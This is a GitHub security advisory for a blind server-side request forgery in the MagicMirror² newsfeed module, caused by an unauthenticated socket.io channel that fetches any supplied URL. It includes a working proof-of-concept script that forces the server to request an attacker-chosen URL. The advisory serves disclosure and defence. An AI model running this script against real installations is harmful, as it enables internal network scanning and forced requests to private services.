# [M] MagicMirror newsfeed Socket.IO notification allows blind server-side request forgery

## Summary
Severity: Medium
Advisory: GHSA-998g-7v5w-cr7g
CVE: CVE-2026-63642
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:N/SA:N (CVSS_V4)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-998g-7v5w-cr7g
Type: github-advisory

## Affected
- npm: `magicmirror` — affected >=0 <2.37.0

## Details
# Vulnerability — Blind SSRF via `CHECK_ARTICLE_URL` (MagicMirror² newsfeed)

> Analysis of the PoC `exploit-ssrf-newsfeed.js`.
> Target: `newsfeed/node_helper.js` of MagicMirror², socket.io namespace `/newsfeed`.

---

## Identification

| Field | Value |
|-------|-------|
| **PoC file** | `exploit-ssrf-newsfeed.js` |
| **Endpoint** | socket.io namespace `/newsfeed`, notification `CHECK_ARTICLE_URL` |
| **Precondition** | reach the mirror's HTTP port (no authentication required) |

---

## Description

The `checkArticleUrl()` function in `newsfeed/node_helper.js` runs `fetch(url, { method: "HEAD" })` with **zero validation** of the URL and returns `ARTICLE_URL_STATUS { url, canFrame }`.

This gives the attacker a **boolean + timing oracle** to map internal hosts and ports: presence, absence, and response time reveal which internal services are alive. It is a "blind-ish" SSRF — the attacker doesn't see the body, but forces the server-side request and observes the effect on the target.

The actual proof is observed **on the target side** (the server-side HEAD shows up in the internal service's log), since the `canFrame` field alone leaks little.

---

## Root cause: unauthenticated socket.io channel + permissive CORS

The socket.io server accepts connections from **any origin** and with **no authentication**:

```js
const io = new Server(server, {
  cors: { origin: /.*$/, credentials: true }
});
```

The `/newsfeed` namespace registers the handler without checking who is connected (**CWE-306**). Any process or browser tab that can reach the mirror's port can emit the notification.

---

## Exploit (`exploit-ssrf-newsfeed.js`)

```js
const { io } = require("socket.io-client");
const TARGET = process.env.MM || "https://target/";
const URL_TO_HIT = process.env.SSRF_URL || "https://webhook.site";
const socket = io(`${TARGET}/newsfeed`, { path: "/socket.io", transports: ["websocket", "polling"] });

socket.onAny((event, payload) => {
	if (event === "ARTICLE_URL_STATUS") {
		console.log(`[+] ARTICLE_URL_STATUS: ${JSON.stringify(payload)}`);
		console.log("[!!!] Server performed a server-side HEAD request to the internal host (SSRF).");
		process.exit(0);
	}
});
socket.on("connect", () => {
	console.log(`[*] Connected to ${TARGET}/newsfeed (no auth). CHECK_ARTICLE_URL -> ${URL_TO_HIT}`);
	socket.emit("CHECK_ARTICLE_URL", { url: URL_TO_HIT });
});
setTimeout(() => { console.log("[*] timeout"); process.exit(1); }, 12000);
```

---

## Vulnerable target code (pattern)

```js
async checkArticleUrl(url) {
  const res = await fetch(url, { method: "HEAD" });
  const canFrame = !res.headers.get("x-frame-options")
                && !/frame-ancestors/i.test(res.headers.get("content-security-policy") || "");
  this.sendSocketNotification("ARTICLE_URL_STATUS", { url, canFrame });
}
```

---

## Impact

- **Internal network scanning / port scanning**: presence, absence, and response time reveal which internal hosts and ports are alive.
- Forcing server-side requests to internal services (the HEAD reaches the target, as observed in the `mm-internal` log referenced by the PoC).
- Although it's HEAD (no body), it serves as a **reconnaissance primitive** and a trigger for side effects on endpoints that react to GET/HEAD.

---



### References
- CWE-918: Server-Side Request Forgery (SSRF)
- CWE-306: Missing Authentication for Critical Function
- CWE-942: Permissive Cross-domain Policy with Untrusted Domains
- OWASP: SSRF Prevention Cheat Sheet

> This PoC and report are intended solely for authorized security testing / research in a controlled lab environment.

## References
- https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-998g-7v5w-cr7g
- https://github.com/MagicMirrorOrg/MagicMirror/pull/4169
- https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f
- https://github.com/MagicMirrorOrg/MagicMirror
- https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0
